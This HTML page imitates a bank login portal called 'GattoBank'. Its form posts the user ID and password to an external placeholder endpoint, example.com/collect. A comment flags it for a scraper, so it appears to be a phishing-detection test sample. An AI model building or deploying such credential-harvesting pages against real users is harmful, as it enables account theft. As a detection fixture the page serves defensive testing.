<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>GattoBank Secure Login</title>
    <style>
      :root{
        --bg:#020617; --card:#0b1220; --muted:#94a3b8; --text:#e2e8f0;
        --accent:#ef4444; --accent2:#f97316; --border:rgba(255,255,255,.06);
      }
      *{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial}
      body{margin:0;min-height:100vh;background:linear-gradient(180deg,var(--bg),#000);color:var(--text);display:flex;align-items:center;justify-content:center;padding:24px}
      .panel{width:100%;max-width:860px;background:linear-gradient(180deg,var(--card),#060b16);border:1px solid var(--border);border-radius:18px;padding:28px;box-shadow:0 20px 60px rgba(0,0,0,.35)}
      .brand{display:flex;align-items:center;gap:12px;margin-bottom:10px}
      .logo{width:46px;height:46px;border-radius:14px;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;font-weight:900;color:#1f2937}
      h1{margin:10px 0 6px;font-size:26px}
      .hint{color:var(--muted);font-size:13px}
      .form{margin-top:16px;display:grid;gap:10px}
      label{font-size:12px;color:var(--muted)}
      input{width:100%;padding:12px;border-radius:12px;border:1px solid var(--border);background:rgba(2,6,23,.65);color:var(--text);outline:none}
      .btn{margin-top:10px;padding:12px 14px;border-radius:12px;border:0;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#111827;font-weight:900;cursor:pointer}
      .btn:hover{filter:brightness(1.05)}
      .note{margin-top:10px;color:var(--muted);font-size:12px}
    </style>
  </head>
  <body>
    <section class="panel">
      <div class="brand">
        <div class="logo">GB</div>
        <div>
          <div class="hint">Official Portal</div>
          <div style="font-weight:800">GattoBank</div>
        </div>
      </div>


      <h1>Secure Login</h1>
      <div class="hint">Sign in to verify your session.</div>


      <!-- NOTE: external action (your scraper can flag this) -->
      <form class="form" action="https://example.com/collect" method="post">
        <div>
          <label>User ID</label>
          <input name="user" placeholder="Enter User ID" />
        </div>
        <div>
          <label>Password</label>
          <input name="password" type="password" placeholder="••••••••" />
        </div>
        <button class="btn" type="submit">Continue</button>
      </form>


      <div class="note">
        Tip: Always verify the domain and avoid entering credentials on suspicious pages.
      </div>
    </section>
  </body>
</html>
